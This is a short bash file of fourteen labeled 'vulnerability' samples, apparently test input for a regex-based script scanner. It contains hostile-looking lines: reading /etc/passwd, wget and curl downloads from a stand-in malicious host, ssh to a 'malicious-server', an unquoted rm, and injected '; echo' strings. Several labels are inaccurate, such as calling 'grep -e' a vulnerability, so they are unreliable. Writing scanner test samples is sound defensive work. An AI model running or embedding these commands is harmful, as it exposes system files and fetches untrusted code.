#!/bin/bash

# Vulnerability 1: Command Injection
user_input="hello; echo 'This is a command injection';"
output=$(echo "User input: $user_input")

# Vulnerability 2: Unsafe Variable Usage
password="secret"
echo "Password is: $password"

# Vulnerability 3: Another Command Injection
filename="file.txt"
rm $filename

# Additional Vulnerabilities

# Vulnerability 4: Potentially Dangerous Command
mv /path/to/source /path/to/destination

# Vulnerability 5: Attempted Access to Sensitive File
cat /etc/passwd

# Vulnerability 6: Potential Download from Malicious Site
wget http://malicious-site.com/malicious-file

# Vulnerability 7: Potential Download from Malicious Site (Alternative)
curl http://malicious-site.com/malicious-file

# Vulnerability 8: Potential Command Injection via Echo/Printf
echo "Input: $(ls)"

# Vulnerability 9: Elevated Privilege Usage
sudo ls /root

# Vulnerability 10: Potential Secure Shell Command
ssh user@malicious-server

# Vulnerability 11: Use of -e flag in grep
grep -e 'pattern' /path/to/file

# Additional Command Injection Examples

# Vulnerability 12
command="ls"
output1=$($command)

# Vulnerability 13
input="; echo 'Malicious Payload';"
output2=$(echo "User input: $input")

# Vulnerability 14
input3="$(echo 'hello')$(echo '; echo "Command Injection";')"
output3=$(echo "User input: $input3")

# Feel free to add more examples based on the patterns from regex_config.json
